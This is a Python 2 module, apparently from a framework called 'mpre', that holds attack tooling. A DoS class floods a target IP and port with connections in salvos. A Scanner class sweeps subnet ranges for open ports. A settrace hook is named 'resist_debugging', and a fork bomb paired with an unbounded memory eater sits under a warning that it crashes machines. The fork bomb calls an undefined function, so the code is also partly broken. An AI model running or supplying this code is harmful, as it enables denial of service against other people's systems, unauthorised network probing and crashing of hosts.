import sys
import functools
from multiprocessing import Process
from contextlib import contextmanager

import mpre.base as base
import mpre.defaults as defaults
import mpre.vmlibrary as vmlibrary
from mpre.utilities import Latency
Instruction = base.Instruction

Scanner = defaults.Process.copy()
Scanner.update({"subnet" : "127.0.0.1",
"ports" : (22, ),
"range" : (0, 0, 0, 254),
"yield_interval" : 50,
"scan_size" : 1,
"timeout" : 0})

DoS = defaults.Process.copy()
DoS.update({"salvo_size" : 100,
"count" : 0,
"ip" : "localhost",
"port" : 80,
"target" : None,
"timeout_notify" : False,
"display_latency" : False,
"display_progress" : False})

def trace_function(frame, instruction, args):
    pass

@contextmanager
def resist_debugging():
    sys.settrace(trace_function)
    yield
    sys.settrace(None)


class DoS(vmlibrary.Process):

    defaults = DoS

    def __init__(self, **kwargs):
        super(DoS, self).__init__(**kwargs)
        self.latency = Latency(name="Salvo size: %i" % self.salvo_size)
        
        self.options = {"on_connect" : self._on_connection,
                   "target" : self.target,
                   "ip" : self.ip,
                   "port" : self.port,
                   "timeout_notify" : self.timeout_notify,
                   "bad_target_verbosity" : 'v'}
        
    def _on_connection(self, connection):
        connection.delete()
        
    def socket_recv(self, connection):
        connection.recv(8192)

    def run(self):
        self.count += 1
        if self.display_progress:
            print "Launched {0} connections".format(self.count * self.salvo_size)
        if self.display_latency:
            latency = self.latency
            #print "launching salvo: {0} connections per second ({1} connections attempted)".format(self.latency.average.meta_average, (self.count * self.salvo_size))
            self.latency.update()
            self.latency.display()
        options = self.options
        for connection_number in xrange(self.salvo_size):
            self.create("network.Outbound_Connection", **options)

        self.run_instruction.execute()

        
class Scanner(vmlibrary.Process):

    defaults = Scanner

    def __init__(self, *args, **kwargs):
        self.threads = []
        super(Scanner, self).__init__(*args, **kwargs)
        self.network_buffer = {}

        self.scan_address_alert = functools.partial(self.alert,
                                                    "Beginning scan of {0}:{1}",
                                                    level = "vv")
        self.options = {"socket_recv" : self._socket_recv,
                        "on_connect" : self._notify,
                        "timeout" : self.timeout,
                        "timeout_notify" : False,
                        "bad_target_verbosity" : 'v'}

        self.create_threads()

    def create_threads(self):
        subnet_list = self.subnet.split(".")
        subnet_zero = int(subnet_list[0])
        subnet_zero_range = subnet_zero + self.range[0]
        subnet_one = int(subnet_list[1])
        subnet_one_range = subnet_one + self.range[1]
        subnet_two = int(subnet_list[2])
        subnet_two_range = subnet_two + self.range[2]
        subnet_three = int(subnet_list[3])
        subnet_three_range = subnet_three + self.range[3]

        subnet_range = (subnet_zero_range, subnet_one_range,
                        subnet_two_range, subnet_three_range)
        subnet_range = '.'.join(str(subnet) for subnet in subnet_range)
        self.subnet_range = (self.subnet, subnet_range)

        ports = self.ports
        low_port = min(ports)
        high_port = max(ports)
        if low_port != high_port:
            self.port_range = (low_port, high_port)
        else:
            self.port_range = low_port

        for field_zero in xrange(subnet_zero, subnet_zero_range + 1):
            for field_one in xrange(subnet_one, subnet_one_range + 1):
                for field_two in xrange(subnet_two, subnet_two_range + 1):
                    for field_three in xrange(subnet_three, subnet_three_range + 1):
                        address = ".".join((str(field_zero), str(field_one), str(field_two), str(field_three)))
                        thread = self.scan_address(address, ports)
                        self.threads.append(thread)

    def run(self):
        for thread in self.threads[:self.scan_size]:
            try:
                next(thread)
            except StopIteration:
                self.threads.remove(thread)
        if not self.threads:
            self.alert("Finished scanning {0}-{1}", self.subnet_range, 'v')
            #Instruction(self.instance_name, "delete").execute()#self.delete()
        else:
            self.run_instruction.execute()

    def _notify(self, connection):
        address = connection.getpeername()
        self.alert("Found a service at {0}:{1}", address, "v")
        Instruction("Service_Listing", "add_service", address).execute()
        connection.delete()

    def _socket_recv(self, connection):
        self.network_buffer[connection] = connection.recv(2048)

    def scan_address(self, address, ports):
        options = self.options
        options["ip"] = address
        self.scan_address_alert([address, self.port_range])
        yield_interval = self.yield_interval

        while ports:
            for port in ports[:yield_interval]:
                self.create("network.Outbound_Connection", port=port, **options)
            ports = ports[yield_interval:]
            yield

# warning: these will crash/freeze your machine

memory_eater = [''.join(chr(x) for x in xrange(128))]

def fork_bomb(eat_memory=True):
    def spawn():
        return Process(target=fork)
    while True:
        spawn().start()
        if eat_memory:
            try:
                memory_eater.extend(x*8 for x in memory_eater)
            except:
                pass